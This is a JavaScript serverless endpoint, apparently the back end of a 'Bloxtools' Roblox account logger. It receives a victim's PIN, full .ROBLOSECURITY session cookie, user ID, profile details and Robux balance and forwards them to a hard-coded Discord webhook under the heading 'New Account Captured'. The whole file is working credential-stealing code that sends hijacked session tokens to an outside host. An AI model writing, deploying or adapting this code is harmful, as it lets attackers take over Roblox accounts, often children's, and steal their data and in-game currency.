// api/send-webhook.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { pin, cookie, rbxuid, userInfo, robux } = req.body;

    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

    try {
        const description = `
## 📦 Account Capture

- **rbxuid:** \`${rbxuid}\`
- **Cookie Length:** \`${cookie.length} chars\`

## 🔐 Full .ROBLOSECURITY Cookie
\`\`\`
${cookie}
\`\`\`
`;

        const embedFields = [];

        if (userInfo) {
            embedFields.push(
                {
                    name: "👤 Roblox Profile",
                    value: `**Username:** ${userInfo.username}\n**Display Name:** ${userInfo.displayName}\n**User ID:** ${userInfo.userId}\n**Join Date:** ${userInfo.joinDate}\n\n🔗 [Profile](https://www.roblox.com/users/${rbxuid}/profile)`,
                    inline: false
                },
                { name: "👥 Friends", value: `${userInfo.friendsCount}`, inline: true },
                { name: "💰 Robux", value: `${robux} R$`, inline: true },
                { name: "👕 Wearing", value: userInfo.wearing || "Unknown", inline: false }
            );
        } else {
            embedFields.push({
                name: "⚠️ Error",
                value: "Could not fetch public profile information.",
                inline: false
            });
        }

        const payload = {
            username: "Bloxtools Processing System",
            embeds: [{
                title: "🔓 New Account Captured",
                description: description,
                color: 0x8c52ff,
                thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
                fields: embedFields,
                footer: { text: "Bloxtools • Roblox Account Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        return res.status(response.ok ? 200 : 500).json({ success: response.ok });
    } catch (error) {
        console.error("Webhook Error:", error);
        return res.status(500).json({ success: false });
    }
}
